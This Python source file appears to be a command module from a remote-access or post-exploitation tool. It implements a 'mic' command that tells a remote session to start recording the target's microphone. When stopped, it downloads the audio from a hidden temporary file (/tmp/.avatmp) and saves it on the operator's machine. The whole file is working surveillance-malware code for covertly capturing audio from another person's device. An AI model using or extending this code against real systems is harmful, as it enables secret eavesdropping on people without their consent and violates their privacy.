#!/usr/bin/env python3

import core.helper as h
import json
import time
import os

class command:
    def __init__(self):
        self.name = "mic"
        self.description = "Record microphone sound."
        self.usage = "Usage: mic [start|stop <local_path>]"
        
    def run(self,session,cmd_data):
        if not cmd_data['args']:
            print(self.usage)
            return
        else:
            if cmd_data['args'].split()[0] == "start":
                pass
            else:
                if len(cmd_data['args'].split()) < 2 or cmd_data['args'].split()[0] != "stop":
                    print(self.usage)
                    return
		
        if cmd_data['args'].split()[0] == "stop":
            dest = cmd_data['args'].split()[1]
            cmd_data['args'] = "stop"
            if os.path.isdir(dest):
                if os.path.exists(dest):
                    h.info_general("Stopping recording microphone...")
                    result = json.loads(session.send_command(cmd_data))
                    if 'error' in result:
                        h.info_error("Failed to record mic!")
                        return
                    elif 'status' in result and result['status'] == 1:
                        data = session.download_file("/tmp/.avatmp")
                        f = open(os.path.join(dest,'mic.caf'),'wb')
                        f.write(data)
                        f.close()
                    if dest[-1] == "/":
                        h.info_general("Saving to "+dest+"mic.caf...")
                        time.sleep(1)
                        h.info_success("Saved to "+dest+"mic.caf!")
                    else:
                        h.info_general("Saving to "+dest+"/mic.caf...")
                        time.sleep(1)
                        h.info_success("Saved to "+dest+"/mic.caf!")
                else:
                    h.info_error("Local directory: "+dest+": does not exist!")
            else:
                rp = os.path.split(dest)[0]
                if rp == "":
                    rp = "."
                else:
                    pass
                if os.path.exists(rp):
                    if os.path.isdir(rp):
                        pr = os.path.split(dest)[0]
                        rp = os.path.split(dest)[1]
                        h.info_general("Stopping recording microphone...")
                        result = json.loads(session.send_command(cmd_data))
                        if 'error' in result:
                            h.info_error("Failed to record mic!")
                            return
                        elif 'status' in result and result['status'] == 1:
                            data = session.download_file("/tmp/.avatmp")
                            f = open(os.path.join(pr,rp),'wb')
                            f.write(data)
                            f.close()
                        h.info_general("Saving to "+dest+"...")
                        time.sleep(1)
                        h.info_success("Saved to "+dest+"!")
                    else:
                        h.info_error("Error: "+rp+": not a directory!")
                else:
                    h.info_error("Local directory: "+rp+": does not exist!")

        elif cmd_data['args'].split()[0] == "start":
            cmd_data['args'] = "record"
            h.info_general("Starting recording microphone...")
            session.send_command(cmd_data)
